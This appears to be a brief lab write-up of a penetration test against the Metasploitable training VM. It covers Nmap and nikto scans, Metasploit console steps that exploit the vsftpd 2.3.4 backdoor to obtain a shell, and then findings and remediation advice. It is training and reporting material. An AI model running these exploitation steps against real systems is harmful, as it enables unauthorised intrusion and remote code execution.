Metasploitable Pentest

Summary: Lab-based penetration test against Metasploitable to practice enumeration, exploitation, and reporting. Ethical lab, isolated environment.

Tools & scope

  • Nmap, Metasploit Framework, smbclient, nikto, curl, nc
  • Target: Metasploitable (lab VM only)

Objective / threat scenario

Assess common legacy vulnerabilities and demonstrate the full chain: discovery → exploit → proof → remediation.

Enumeration (example)

# Initial port and service scan
nmap -sC -sV -oN nmap_initial.txt 10.0.2.20

# Quick web scan
nikto -host http://10.0.2.20

Sample relevant nmap output (trimmed):

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.3.4
22/tcp   open  ssh      OpenSSH 4.7p1
80/tcp   open  http     Apache 2.2.8
139/tcp  open  netbios-ssn Samba smbd 3.X

Exploit (example: vsftpd 2.3.4 backdoor)

# Metasploit example
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 10.0.2.20
exploit

# After successful exploit
whoami

Proof of concept: captured shell, `whoami` showed msfuser. Stored session logs in artifacts.

Findings

  • High: Unauthenticated FTP backdoor (vsftpd 2.3.4) — remote code execution
  • Medium: Outdated web server and default creds on some services

Remediation

  1. Patch or replace vulnerable services (upgrade vsftpd to supported version)
  2. Restrict management services to internal networks only
  3. Implement IDS rules to detect exploit signatures
